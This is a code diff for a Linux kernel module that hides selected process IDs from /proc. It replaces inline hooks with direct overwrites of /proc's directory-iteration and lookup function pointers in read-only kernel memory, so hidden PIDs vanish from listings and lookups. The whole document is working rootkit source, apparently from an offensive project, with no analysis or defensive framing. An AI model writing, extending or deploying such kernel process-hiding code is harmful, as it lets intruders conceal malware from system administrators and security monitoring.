@@ -15,17 +15,9 @@
 #include <linux/dcache.h>
 
 #include "inline_hook/p_lkrg_main.h"
+#include "inline_hook/utils/p_memory.h"
 
-#if defined(CONFIG_ARM64)
-static inline unsigned long p_inline_regs_get_arg2(hk_regs *p_regs) {
-   return p_regs->regs[1];
-}
-static inline void p_inline_regs_set_arg2(hk_regs *p_regs, unsigned long p_val) {
-   p_regs->regs[1]=p_val;
-}
-#endif
-
-// --- PID list management (unchanged) ---
+// --- PID list management (copied from original) ---
 struct hidden_pid_entry {
     struct list_head list;
     pid_t pid;
@@ -97,34 +89,20 @@ void clear_hidden_pids(void) {
     printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
 }
 
-// --- Inline hook implementation ---
 
-// Forward declarations
-int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs);
-int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs);
-int proc_lookup_ret(unsigned long ret_addr, hk_regs *regs);
+// --- New implementation using function pointer overwrite ---
 
-// Hook state
-static char proc_readdir_hook_state = 0;
-static char proc_lookup_hook_state = 0;
-
-// Hook structures (name removed, will use target_addr)
-static struct p_hook_struct proc_readdir_hook = {
-    .entry_fn = proc_readdir_entry,
-    .ret_fn = proc_readdir_ret,
-};
-
-// Dummy entry function to prevent crash
-int proc_lookup_entry(unsigned long ret_addr, hk_regs *regs) {
-    return 0;
-}
-
-static struct p_hook_struct proc_lookup_hook = {
-    .entry_fn = proc_lookup_entry,
-    .ret_fn = proc_lookup_ret,
-};
-
+// Pointers to store the original functions
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+static int (*original_iterate)(struct file *, struct dir_context *);
+#else
+static int (*original_iterate)(struct file *, void *, filldir_t);
+#endif
+static struct dentry * (*original_lookup)(struct inode *,struct dentry *, unsigned int);
+
+
+// --- Replacement for readdir/iterate ---
+
 struct hooked_dir_context {
     struct dir_context original;
     struct dir_context *original_ctx;
@@ -138,89 +116,90 @@ static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
 
     pid = simple_strtol(name, &endptr, 10);
     if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
-        return 0;
+        return 0; // Skip this entry
     }
 
+    // Call the original actor
     return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
 }
 
-int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) {
-    struct dir_context *original_ctx = (struct dir_context *)p_inline_regs_get_arg2(regs);
-    struct hooked_dir_context *hooked_ctx;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+// Our replacement for the ->iterate_shared function pointer
+static int hooked_iterate(struct file *file, struct dir_context *ctx)
+{
+    struct hooked_dir_context hooked_ctx;
+    int ret;
 
-    if (!original_ctx || !original_ctx->actor) {
-        regs->regs[19] = (unsigned long)NULL;
-        return 0;
+    if (!ctx || !ctx->actor) {
+        return original_iterate(file, ctx);
     }
 
-    hooked_ctx = kmalloc(sizeof(*hooked_ctx), GFP_ATOMIC);
-    if (!hooked_ctx) {
-        regs->regs[19] = (unsigned long)NULL;
-        return 0;
-    }
+    hooked_ctx.original_ctx = ctx;
+    memcpy(&hooked_ctx.original, ctx, sizeof(struct dir_context));
+    *(filldir_t *)(&hooked_ctx.original.actor) = hooked_filldir;
 
-    // Initialize by copying, then overwrite the const actor via a pointer cast
-    memcpy(&hooked_ctx->original, original_ctx, sizeof(struct dir_context));
-    *(filldir_t *)(&hooked_ctx->original.actor) = hooked_filldir;
-    hooked_ctx->original_ctx = original_ctx;
+    ret = original_iterate(file, &hooked_ctx.original);
 
-    p_inline_regs_set_arg2(regs, (unsigned long)&hooked_ctx->original);
+    ctx->pos = hooked_ctx.original.pos;
 
-    regs->regs[19] = (unsigned long)hooked_ctx;
-
-    return 0;
-}
-
-int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs) {
-    struct hooked_dir_context *hooked_ctx = (struct hooked_dir_context *)regs->regs[19];
-
-    if (hooked_ctx) {
-        hooked_ctx->original_ctx->pos = hooked_ctx->original.pos;
-        kfree(hooked_ctx);
-    }
-
-    return 0;
+    return ret;
 }
 #else
-// Dummy functions for older kernels
-int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) { return 0; }
-int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs) { return 0; }
+// Legacy version for older kernels
+static int hooked_iterate(struct file *file, void *dirent, filldir_t filldir)
+{
+    // This implementation is more complex and left as an exercise
+    // For this project, we focus on modern kernels.
+    return original_iterate(file, dirent, filldir);
+}
 #endif
 
-int proc_lookup_ret(unsigned long ret_addr, hk_regs *regs) {
-    struct dentry *dentry_arg = (struct dentry *)p_inline_regs_get_arg2(regs);
-    struct dentry *result_dentry = (struct dentry *)regs->regs[0];
+
+// --- Replacement for lookup ---
+
+static struct dentry * hooked_lookup(struct inode *dir, struct dentry *dentry, unsigned int flags)
+{
+    struct dentry *result_dentry;
     const char *name;
     char *endptr;
     long pid;
 
-    if (!result_dentry || IS_ERR(result_dentry)) {
-        return 0;
+    result_dentry = original_lookup(dir, dentry, flags);
+
+    if (!result_dentry || IS_ERR(result_dentry) || !dentry || !dentry->d_name.name) {
+        return result_dentry;
     }
 
-    if (!dentry_arg || !dentry_arg->d_name.name) {
-        return 0;
-    }
-
-    name = dentry_arg->d_name.name;
+    name = dentry->d_name.name;
     pid = simple_strtol(name, &endptr, 10);
 
     if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
         dput(result_dentry);
-        regs->regs[0] = (unsigned long)NULL;
+        return ERR_PTR(-ENOENT); // Return error correctly
     }
 
-    return 0;
+    return result_dentry;
+}
+
+
+// --- Init and Exit functions ---
+
+static int write_kernel_memory(void *addr, void *new_val, size_t size) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 8, 0)
+    return write_ro_memory(addr, new_val, size);
+#else
+    return remap_write_range(addr, new_val, size, true);
+#endif
 }
 
 int hide_proc_init(void) {
     struct path proc_path;
     struct inode *proc_inode;
-    void *readdir_ptr = NULL;
-    void *lookup_ptr = NULL;
+    struct file_operations *fops;
+    struct inode_operations *iops;
     int ret;
 
-    printk(KERN_INFO "[hide_proc] Initializing process hiding (inline hook, dynamic address)\n");
+    printk(KERN_INFO "[hide_proc] Initializing process hiding (function pointer overwrite)\n");
 
     ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
     if (ret) {
@@ -235,45 +214,91 @@ int hide_proc_init(void) {
         return -ENOENT;
     }
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
-    readdir_ptr = (void *)proc_inode->i_fop->iterate_shared;
-    if (!readdir_ptr) {
-        readdir_ptr = (void *)proc_inode->i_fop->iterate;
-    }
-#else
-    readdir_ptr = (void *)proc_inode->i_fop->readdir;
-#endif
-    lookup_ptr = (void *)proc_inode->i_op->lookup;
-
+    fops = (struct file_operations *)proc_inode->i_fop;
+    iops = (struct inode_operations *)proc_inode->i_op;
     path_put(&proc_path);
 
-    if (!readdir_ptr || !lookup_ptr) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+    original_iterate = fops->iterate_shared ? fops->iterate_shared : fops->iterate;
+#else
+    original_iterate = fops->readdir;
+#endif
+    original_lookup = iops->lookup;
+
+    if (!original_iterate || !original_lookup) {
         printk(KERN_ERR "[hide_proc] Failed to find readdir/lookup function pointers.\n");
         return -ENOENT;
     }
 
-    proc_readdir_hook.target_addr = readdir_ptr;
-    proc_lookup_hook.target_addr = lookup_ptr;
-
-    ret = p_install_hook(&proc_readdir_hook, &proc_readdir_hook_state, 0);
+    preempt_disable();
+    
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+    if (fops->iterate_shared) {
+        ret = write_kernel_memory(&fops->iterate_shared, &hooked_iterate, sizeof(void *));
+    } else {
+        ret = write_kernel_memory(&fops->iterate, &hooked_iterate, sizeof(void *));
+    }
+#else
+    ret = write_kernel_memory(&fops->readdir, &hooked_iterate, sizeof(void *));
+#endif
     if (ret) {
-        printk(KERN_ERR "[hide_proc] Failed to hook readdir function at %p\n", readdir_ptr);
+        preempt_enable();
+        printk(KERN_ERR "[hide_proc] Failed to hook readdir function.\n");
         return ret;
     }
 
-    ret = p_install_hook(&proc_lookup_hook, &proc_lookup_hook_state, 0);
+    ret = write_kernel_memory(&iops->lookup, &hooked_lookup, sizeof(void *));
     if (ret) {
-        printk(KERN_ERR "[hide_proc] Failed to hook lookup function at %p\n", lookup_ptr);
-        p_uninstall_hook(&proc_readdir_hook, &proc_readdir_hook_state);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+        if (fops->iterate_shared) write_kernel_memory(&fops->iterate_shared, &original_iterate, sizeof(void *));
+        else write_kernel_memory(&fops->iterate, &original_iterate, sizeof(void *));
+#else
+        write_kernel_memory(&fops->readdir, &original_iterate, sizeof(void *));
+#endif
+        preempt_enable();
+        printk(KERN_ERR "[hide_proc] Failed to hook lookup function.\n");
         return ret;
     }
+    preempt_enable();
 
+    printk(KERN_INFO "[hide_proc] Successfully hooked /proc operations.\n");
     return 0;
 }
 
 void hide_proc_exit(void) {
-    printk(KERN_INFO "[hide_proc] Exiting process hiding (inline hook)\n");
-    p_uninstall_hook(&proc_readdir_hook, &proc_readdir_hook_state);
-    p_uninstall_hook(&proc_lookup_hook, &proc_lookup_hook_state);
+    struct path proc_path;
+    struct inode *proc_inode;
+    struct file_operations *fops;
+    struct inode_operations *iops;
+    int ret;
+
+    printk(KERN_INFO "[hide_proc] Exiting process hiding (restoring pointers)\n");
+
+    if (!original_iterate || !original_lookup) {
+        return;
+    }
+
+    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
+    if (ret) {
+        printk(KERN_ERR "[hide_proc] Failed to get /proc path for exit: %d\n", ret);
+        return;
+    }
+
+    proc_inode = proc_path.dentry->d_inode;
+    fops = (struct file_operations *)proc_inode->i_fop;
+    iops = (struct inode_operations *)proc_inode->i_op;
+    path_put(&proc_path);
+
+    preempt_disable();
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
+    if (fops->iterate_shared) write_kernel_memory(&fops->iterate_shared, &original_iterate, sizeof(void *));
+    else write_kernel_memory(&fops->iterate, &original_iterate, sizeof(void *));
+#else
+    write_kernel_memory(&fops->readdir, &original_iterate, sizeof(void *));
+#endif
+    write_kernel_memory(&iops->lookup, &original_lookup, sizeof(void *));
+    preempt_enable();
+
     clear_hidden_pids();
+    printk(KERN_INFO "[hide_proc] Restored /proc operations.\n");
 }
